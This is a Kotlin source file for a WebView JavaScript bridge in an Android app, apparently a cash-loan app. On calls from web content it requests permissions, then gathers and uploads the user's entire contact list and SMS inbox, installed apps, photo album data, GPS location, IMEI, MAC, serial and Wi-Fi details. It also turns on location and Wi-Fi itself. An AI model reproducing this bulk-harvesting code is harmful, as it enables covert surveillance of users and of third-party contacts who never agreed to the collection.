package com.fly.cashhill.js

import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.SystemClock
import android.provider.ContactsContract
import android.text.TextUtils
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.FragmentActivity
import androidx.lifecycle.ViewModelStoreOwner
import com.fly.cashhill.MyApplication
import com.fly.cashhill.activity.BaseWebActivity
import com.fly.cashhill.activity.LoginActivity
import com.fly.cashhill.bean.*
import com.fly.cashhill.bean.event.HttpEvent
import com.fly.cashhill.js.bean.AppFleryParseDataBean
import com.fly.cashhill.js.bean.CommentParseDataBean
import com.fly.cashhill.utils.*
import com.fly.cashhill.utils.Cons.JS_KEY_ALBUM_PHOTO
import com.fly.cashhill.utils.Cons.JS_KEY_APPS_FLYER
import com.fly.cashhill.utils.Cons.JS_KEY_CALL_PHONE
import com.fly.cashhill.utils.Cons.JS_KEY_CONTACT_INFO
import com.fly.cashhill.utils.Cons.JS_KEY_COPY
import com.fly.cashhill.utils.Cons.JS_KEY_DEVICE_INFO
import com.fly.cashhill.utils.Cons.JS_KEY_INSTALLATION_INFO
import com.fly.cashhill.utils.Cons.JS_KEY_LOCATION_INFO
import com.fly.cashhill.utils.Cons.JS_KEY_LOGOUT
import com.fly.cashhill.utils.Cons.JS_KEY_NEW_VIEW
import com.fly.cashhill.utils.Cons.JS_KEY_SELECT_CONTACT
import com.fly.cashhill.utils.Cons.JS_KEY_SERVICE_TIME
import com.fly.cashhill.utils.Cons.JS_KEY_SMS_INFO
import com.fly.cashhill.utils.Cons.JS_KEY_TACK_PHOTO
import com.fly.cashhill.utils.Cons.JS_KEY_USER_INFO
import com.fly.cashhill.utils.Cons.SELECT_CONTACTS_CONTRACT
import com.google.gson.Gson
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import kotlinx.coroutines.*
import top.zibin.luban.Luban
import top.zibin.luban.OnCompressListener
import java.io.File
import java.util.*

class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewModelStoreOwner) {
    private var mWebView: WebView
    private var mViewModelStoreOwner: ViewModelStoreOwner
    private var photoFile: File? = null
    private var eventTackPhotoId: String = ""
    private var eventTackPhotoType: String = ""
    private var eventSelectContactId: String = ""

    init {
        mWebView = webView;
        mViewModelStoreOwner = viewModelStoreOwner
    }

    fun parseData(data: Any?, event: String, id: String) {
        when (event) {
            JS_KEY_COPY -> copy(id, data)
            JS_KEY_USER_INFO -> getUserInfo(id)
            JS_KEY_LOGOUT -> logout(id)
            JS_KEY_CONTACT_INFO -> eventContactInfo(id)
            JS_KEY_DEVICE_INFO -> evenDeviceInfo(id)
            JS_KEY_LOCATION_INFO -> eventLocationInfo(id)
            JS_KEY_INSTALLATION_INFO -> eventInstallationInfo(id)
            JS_KEY_SMS_INFO -> eventSmsInfo(id)
            JS_KEY_TACK_PHOTO -> eventTackPhoto(id,data)
            JS_KEY_ALBUM_PHOTO -> eventAlbumInfo(id)
//            JS_KEY_CALENDERS_PHOTO -> eventCalendersInfo(id)
            JS_KEY_SELECT_CONTACT -> eventSelectContact(id)
            JS_KEY_CALL_PHONE -> eventCallPhone(id,data)
            JS_KEY_APPS_FLYER -> eventAppsFlyer(id,data)
            JS_KEY_NEW_VIEW -> eventNewView(id,data)
            JS_KEY_SERVICE_TIME -> eventServiceTime(id,data)
        }
    }

    private fun eventServiceTime(id: String, data: Any?){
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val time: String = commentParseDataBean.value
            DateTool.initTime(time)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_SERVICE_TIME, "Los parámetros son incorrectos.")
        }
    }

    /**
     * 选择通讯录
     */
    private fun eventSelectContact(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: List<String>, all: Boolean) {
                    if (all) {
                        eventSelectContactId = id
                        ActivityManager.getCurrentActivity()?.startActivityForResult(
                            Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI), SELECT_CONTACTS_CONTRACT)
                    }else{
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SELECT_CONTACT)
                    }
                }

                override fun onDenied(permissions: List<String>, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SELECT_CONTACT)
                }
            })
    }

    /**
     *打电话
     */
    private fun eventCallPhone(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val phone: String = commentParseDataBean.value
            val intent = Intent(Intent.ACTION_DIAL, Uri.parse("tel:$phone"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            MyApplication.application.startActivity(intent)
            CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_CALL_PHONE)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_CALL_PHONE, "Los parámetros son incorrectos.")
        }
    }

    /**
     * 埋点
     */
    private fun eventAppsFlyer(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), AppFleryParseDataBean::class.java)
            AppsFlyerUtil.postAF(commentParseDataBean.eventName)
            CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_APPS_FLYER)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_APPS_FLYER, "Los parámetros son incorrectos.")
        }
    }

    /**
     * 跳转新的页面
     */
    private fun eventNewView(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            BaseWebActivity.openWebView(ActivityManager.getCurrentActivity() as AppCompatActivity,commentParseDataBean.value,false)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_NEW_VIEW, "Los parámetros son incorrectos.")
        }
    }


    /**
     * 复制
     */
    private fun copy(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val clipboardManager =
                MyApplication.application.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = ClipData.newPlainText("Label", commentParseDataBean.value)
            clipboardManager.setPrimaryClip(clipData)
            CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_COPY)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                JS_KEY_COPY,
                "Los parámetros son incorrectos."
            )
        }
    }

    /**
     * 获取用户信息
     */
    private fun getUserInfo(id: String) {
        CallBackJS.callBackJsSuccess(
            mWebView,
            id,
            JS_KEY_USER_INFO,
            UserInfoManger.getUserInfoJson()
        )
    }

    /**
     * 退出登录
     */
    private fun logout(id: String) {
        UserInfoManger.logout()
        CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_LOGOUT)
        val intent = Intent(ActivityManager.getCurrentActivity(), LoginActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
        ActivityManager.getCurrentActivity()?.startActivity(intent)

    }

    /**
     * 通讯录信息
     */
    private fun eventContactInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var contactInfoBeans = ContactUtil.getContactInfoList()
                            var contactInfoBeanAuth = ContactInfoBeanAuth();
                            contactInfoBeanAuth.create_time = DateTool.getServerTimestamp()/1000
                            contactInfoBeanAuth.list = contactInfoBeans
                            var applyInfoBean= ApplyInfoBean()
                            applyInfoBean.contact = contactInfoBeanAuth
                            HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_CONTACT_INFO)
                            if (contactInfoBeanAuth!=null) {
                                LogUtils.d("通讯录：${applyInfoBean.toString()}")
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CONTACT_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CONTACT_INFO)
                }
            })
    }

    /**
     * 设备信息
     */
    private fun evenDeviceInfo(id: String) {
        DeviceInfoUtil.openLocService()
        DeviceInfoUtil.openWifi()
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_PHONE_STATE)
            .permission(Permission.Group.STORAGE)
            .request(object : OnPermissionCallback {
                @SuppressLint("MissingPermission")
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        if (!DeviceInfoUtil.isLocServiceEnable() || !DeviceInfoUtil.isOpenWifi()) {
                            CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
                            return
                        }
                        GlobalScope.launch(Dispatchers.IO) {
                            LogUtils.d("需要等待ip,开启WiFi后需要等待一段时间才可进行抓取")
                            Thread.sleep(2000)
                            var batteryBean = BatteryUtil.getBatteryBean()
                            var deviceInfoBean = DeviceInfoBean()
                            deviceInfoBean.create_time=DateTool.getServerTimestamp() / 1000
                            deviceInfoBean.AudioExternal = FileUtil.getAudioExternal().size

                            val storageData = StorageDataBean()
                            storageData.availableMemory = DeviceInfoUtil.getAvailableSpace()
                            storageData.elapsedRealtime=SystemClock.elapsedRealtime()
                            storageData.memorySize = CommonUtil.stringToLong(DeviceInfoUtil.getTotalRam())
                            storageData.isUsingProxyPort=if (DeviceInfoUtil.isWifiProxy()) {
                                "true"
                            } else {
                                "false"
                            }
                            storageData.isUsingVPN=if (DeviceInfoUtil.checkVPN()) {
                                "true"
                            } else {
                                "false"
                            }
                            storageData.ram_total_size=storageData.memorySize
                            storageData.isUSBDebug = if (DeviceInfoUtil.checkUsbStatus()) {
                                "true"
                            } else {
                                "false"
                            }
                            storageData.availableDiskSize =storageData.availableMemory
                            storageData.totalDiskSize=
                                (storageData.memorySize - CommonUtil.stringToLong(
                                    storageData.availableMemory!!
                                )).toString() + ""
                            deviceInfoBean.storage = storageData

                            val generalData = GeneralDataBean()
                            generalData.phone_type = DeviceInfoUtil.getPhoneType()
                            generalData.language=MyApplication.application.resources.configuration.locale.language
                            generalData.locale_display_language =Locale.getDefault().toString()
                            generalData.network_operator_name = DeviceInfoUtil.getOperatorName()
                            generalData.locale_iso_3_country=MyApplication.application.getResources().getConfiguration().locale.getISO3Country()
                            generalData.locale_iso_3_language=MyApplication.application.getResources().getConfiguration().locale.getISO3Language()
                            deviceInfoBean.general_data = generalData

                            val hardwareData = HardwareDataBean()
                            hardwareData.device_model=Build.MODEL
                            hardwareData.imei=DeviceInfoUtil.getIMEI()
                            hardwareData.sys_version=Build.VERSION.SDK_INT.toString() + ""
                            hardwareData.screenResolution = DeviceInfoUtil.getScreenResolution()
                            hardwareData.manufacturerName=Build.BRAND
                            deviceInfoBean.hardware = hardwareData

                            val publicIpData = PublicIpDataBean()
                            publicIpData.first_ip = PublicIP.getIp()
                            deviceInfoBean.public_ip = publicIpData


                            val batteryStatusData = BatteryStatusDataBean()
                            batteryStatusData.is_usb_charge = batteryBean.is_usb_charge
                            batteryStatusData.is_ac_charge = batteryBean.is_ac_charge
                            batteryStatusData.batteryPercentage = batteryBean.battery_level
                            batteryStatusData.battery_temper = batteryBean.battery_temper
                            batteryStatusData.battery_health = batteryBean.battery_health
                            batteryStatusData.batteryStatus = batteryBean.batteryStatus
                            deviceInfoBean.battery_status = batteryStatusData

                            val data = DeviceInfoDataBean()
                            data.isRooted=if (DeviceUtils.isDeviceRooted()) "true" else "false"
                            deviceInfoBean.device_info=data

                            deviceInfoBean.time_zoneId =DeviceInfoUtil.getTimeZoneId()
                            deviceInfoBean.kernel_version=DeviceInfoUtil.getKernelVersion()
                            deviceInfoBean.currentSystemTime=(System.currentTimeMillis() / 1000).toString()
                            deviceInfoBean.AudioInternal = FileUtil.getAudioInternal().size.toString()
                            deviceInfoBean.nettype=DeviceInfoUtil.getNetworkState().toString()
                            deviceInfoBean.serial = Build.SERIAL
                            deviceInfoBean.android_id = DeviceUtils.getAndroidID()
                            deviceInfoBean.kernel_architecture = Build.CPU_ABI
                            deviceInfoBean.build_id = Build.ID
                            deviceInfoBean.ImagesInternal = FileUtil.getImagesInternal().size.toString()
                            deviceInfoBean.build_number = Build.DISPLAY
                            deviceInfoBean.mac = DeviceUtils.getMacAddress()
                            deviceInfoBean.board = Build.BOARD
                            deviceInfoBean.VideoInternal = FileUtil.getVideoInternal().size
                            deviceInfoBean.AudioExternal = FileUtil.getAudioExternal().size
                            deviceInfoBean.build_time = Build.TIME
                            deviceInfoBean.wifilist = DeviceInfoUtil.getWifiList()
                            deviceInfoBean.sensorcount = DeviceInfoUtil.getSensorCount()
                            deviceInfoBean.time_zone = DeviceInfoUtil.getTimeZone()
                            deviceInfoBean.release_date = Build.TIME
                            deviceInfoBean.device_name = DeviceInfoUtil.getDeviceName()
                            deviceInfoBean.ImagesExternal = FileUtil.getImagesExternal().size.toString()
                            deviceInfoBean.security_patch_level = Build.VERSION.SECURITY_PATCH
                            deviceInfoBean.phone_brand = Build.BRAND
                            deviceInfoBean.cur_wifi_mac =  DeviceInfoUtil.regWifiAddress().toString()
                            deviceInfoBean.imei1 = DeviceInfoUtil.getIMEI1()
                            deviceInfoBean.imei1 = DeviceInfoUtil.getIMEI1()
                            deviceInfoBean.build_fingerprint = Build.FINGERPRINT
                            deviceInfoBean.cur_wifi_ssid = DeviceInfoUtil.regWifiSSID()
                            deviceInfoBean.DownloadFiles = FileUtil.getDownloadFile().size
                            val applyInfoBean= ApplyInfoBean()
                            applyInfoBean.device_info = deviceInfoBean
                            HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id, JS_KEY_DEVICE_INFO)
                            LogUtils.d("设备信息：${applyInfoBean}")
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
                }
            })
    }

    /**
     * 位置信息
     */
    private fun eventLocationInfo(id: String) {
        DeviceInfoUtil.openLocService()
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        LocationUtil.initLocationListener()
                        if (!DeviceInfoUtil.isLocServiceEnable()) {
                            CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_LOCATION_INFO)
                            return
                        }
                        GlobalScope.launch(Dispatchers.IO) {
                            var locationBean = LocationBean()
                            var location = LocationUtil.getLocation()
                            locationBean.create_time = DateTool.getServerTimestamp() / 1000
                            var locationGpsBean = LocationGpsBean();

                            if (location == null){
                                LogUtils.d("未获取到定位，延迟获取")
                                delay(5000)
                                location = LocationUtil.getLocation()
                            }

                            if (location != null) {
                                locationGpsBean.latitude = location.latitude.toString()
                                locationGpsBean.longitude = location.longitude.toString()

                                val address = LocationUtil.getAddress(location.latitude, location.longitude)
                                if (address != null) {
                                    LogUtils.d("位置信息address：${address}")
                                    if (TextUtils.isEmpty(address.featureName)) {
                                        address.featureName = address.getAddressLine(0)
                                    }
                                    if (TextUtils.isEmpty(address.featureName)) {
                                        address.featureName = address.subAdminArea
                                    }
                                    if (TextUtils.isEmpty(address.featureName)) {
                                        address.featureName = address.thoroughfare
                                    }
                                    if (TextUtils.isEmpty(address.thoroughfare)) {
                                        address.thoroughfare = address.featureName
                                    }
                                    locationBean.gps_address_province = (address.adminArea)
                                    locationBean.gps_address_city = (address.locality)
                                    locationBean.gps_address_street = (address.thoroughfare)
                                    locationBean.gps_address_address = (address.featureName)

                                }
                            }
                            locationBean.gps = locationGpsBean
                            var applyInfoBean= ApplyInfoBean()
                            applyInfoBean.gps = locationBean

                            LogUtils.d("位置信息：${applyInfoBean}")
                            HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id, JS_KEY_LOCATION_INFO)
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_LOCATION_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_LOCATION_INFO)
                }
            })
    }

    /**
     * 安装信息
     */
    private fun eventInstallationInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var apps = InstallationUtil.getInstallationInfos()
                            var installationInfoBeanAuth = InstallationInfoBeanAuth();
                            installationInfoBeanAuth.create_time = DateTool.getServerTimestamp() / 1000
                            installationInfoBeanAuth.list = apps
                            var applyInfoBean= ApplyInfoBean()
                            applyInfoBean.applist = installationInfoBeanAuth
                            LogUtils.d("安装信息：${applyInfoBean}")
                            HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_INSTALLATION_INFO)
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_INSTALLATION_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_INSTALLATION_INFO)
                }
            })
    }

    /**
     * 短信信息
     */
    private fun eventSmsInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_SMS)
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS)
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var smss = SmsUtil.getSmsList()
                            var smsBeanAuth = SmsBeanAuth()
                            smsBeanAuth.create_time = DateTool.getServerTimestamp() / 1000
                            smsBeanAuth .list = smss
                            var applyInfoBean= ApplyInfoBean()
                            applyInfoBean.sms = smsBeanAuth
                            LogUtils.d("短信信息：${applyInfoBean}")
                            HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_SMS_INFO)
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SMS_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SMS_INFO)
                }
            })
    }

    /**
     * 拍照上传
     */
    private fun eventTackPhoto(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            eventTackPhotoType = commentParseDataBean.value
            XXPermissions.with(ActivityManager.getCurrentActivity())
                .permission(Permission.Group.STORAGE)
                .permission(Permission.CAMERA)
                .request(object : OnPermissionCallback {
                    override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                        if (all) {
                            eventTackPhotoId = id
                            photoFile = CommonUtil.tackPhoto()
                        } else {
                            CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_TACK_PHOTO)
                        }
                    }

                    override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_TACK_PHOTO)
                    }
                })
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_CALL_PHONE, "Los parámetros son incorrectos.")
        }

    }

    var imageDataSource = ImageDataSource()

    /**
     * 相册信息
     */
    private fun eventAlbumInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.STORAGE)
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        imageDataSource.setOnImageLoadListener(object :ImageDataSource.OnImageLoadListener{
                            override fun onImageLoad(imageFolders: ArrayList<AlbumInfoBean>) {
                                imageDataSource.unOnImageLoadListener()
                                GlobalScope.launch(Dispatchers.IO) {
                                    var albumInfoBeanAuth = AlbumInfoBeanAuth()
                                    albumInfoBeanAuth.create_time = DateTool.getServerTimestamp() / 1000
                                    albumInfoBeanAuth.list = imageFolders
                                    var applyInfoBean= ApplyInfoBean()
                                    applyInfoBean.image = albumInfoBeanAuth
                                    LogUtils.d("相册信息：+${applyInfoBean}")
                                    HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_ALBUM_PHOTO)
                                }
                            }
                        })
                        GlobalScope.launch(Dispatchers.Main){
                            imageDataSource.load(ActivityManager.getCurrentActivity() as FragmentActivity)
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_ALBUM_PHOTO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_ALBUM_PHOTO)
                }
            })
    }

//    /**
//     * 日历信息
//     */
//    private fun eventCalendersInfo(id: String) {
//        XXPermissions.with(ActivityManager.getCurrentActivity())
//            .permission(Permission.Group.CALENDAR)
//            .request(object : OnPermissionCallback {
//                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
//                    if (all) {
//                        GlobalScope.launch(Dispatchers.IO){
//                            var calendersInfoBeans = CalendersUtil.getCalendersList()
//                            LogUtils.d("日历信息：${calendersInfoBeans}")
//                            withContext(Dispatchers.Main){
//                                var applyInfoBean= ApplyInfoBean()
//                                applyInfoBean.calenders_info = calendersInfoBeans
//                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_CALENDERS_PHOTO)
//                            }
//                        }
//                    } else {
//                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CALENDERS_PHOTO)
//                    }
//                }
//
//                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
//                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CALENDERS_PHOTO)
//                }
//            })
//    }

    fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == Cons.TACK_PHOTO) {
            if (resultCode == Activity.RESULT_OK) {
                //自拍信息
                photoFile?.let {
                    LogUtils.d("压缩前：" + it.length())
                    Luban.with(ActivityManager.getCurrentActivity())
                        .load(it)
                        .ignoreBy(100)
                        .setTargetDir(CommonUtil.getImageDir())
                        .filter { path ->
                            !(TextUtils.isEmpty(path) || path.lowercase(Locale.getDefault()).endsWith(".gif"))
                        }
                        .setCompressListener(object : OnCompressListener {
                            override fun onStart() {

                            }

                            override fun onSuccess(file: File?) {
                                if (file != null){
                                    HttpEvent.uploadImage(file,eventTackPhotoType, mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO)
                                    LogUtils.d("压缩后：" + (file?.length() ?: "0"))
                                }else{
                                    CallBackJS.callbackJsErrorOther(mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO, "Ninguno.")
                                }
                            }

                            override fun onError(e: Throwable?) {
                                CallBackJS.callbackJsErrorOther(mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO, e.toString())
                            }
                        }).launch()
                }
//                GlobalScope.launch(Dispatchers.IO) {
//                    var file: File? = null
//                    photoFile?.let {
//                        LogUtils.d("压缩前：" + it.length())
//                        try {
//                            file = ImageUtils.compressImage(it.absolutePath)
//                        }catch (e:Exception){
//                            e.printStackTrace()
//                            file = photoFile
//                        }
//                        LogUtils.d("压缩后：" + (file?.length() ?: "0"))
//                    }
//                    withContext(Dispatchers.Main) {
//                        if (file == null) {
//                            CallBackJS.callbackJsErrorOther(mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO, "La carga de la imagen falló.")
//                            return@withContext
//                        }
//                        file?.let {
//                            HttpEvent.uploadImage(it,eventTackPhotoType, mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO)
//                        }
//                    }
//                }
            } else {
                CallBackJS.callbackJsErrorOther(mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO, "Ninguno.")
            }
        } else if (requestCode == SELECT_CONTACTS_CONTRACT){
            if (resultCode == Activity.RESULT_OK) {
                val contactBean = ContactSelectInfoBean()
                if (data == null || data.data == null) {
                    CallBackJS.callbackJsErrorOther(mWebView, eventSelectContactId, JS_KEY_SELECT_CONTACT,"Ninguno")
                    return
                }
                var cursor:Cursor? = null
                var phone :Cursor? = null
                try {
                    val reContentResolverol: ContentResolver = MyApplication.application.contentResolver
                    cursor = reContentResolverol.query(data.data!!, null, null, null, null)
                    cursor?.let {
                        it.moveToFirst()
                        contactBean.name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                        // 条件为联系人ID
                        val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                        // 获得DATA表中的电话号码，条件为联系人ID,因为手机号码可能会有多个
                        phone = reContentResolverol.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null)
                        phone?.let { p->
                            while (p.moveToNext()) {
                                contactBean.mobile = p.getString(p.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            }
                        }
                    }
                }catch (e:Exception){
                    e.printStackTrace()
                }finally {
                    phone?.close()
                    cursor?.close()
                }
                CallBackJS.callBackJsSuccess(mWebView,eventSelectContactId,JS_KEY_SELECT_CONTACT,Gson().toJson(contactBean))
            }else{
                CallBackJS.callbackJsErrorOther(mWebView, eventSelectContactId, JS_KEY_SELECT_CONTACT,"Ninguno")
            }
        }
    }
}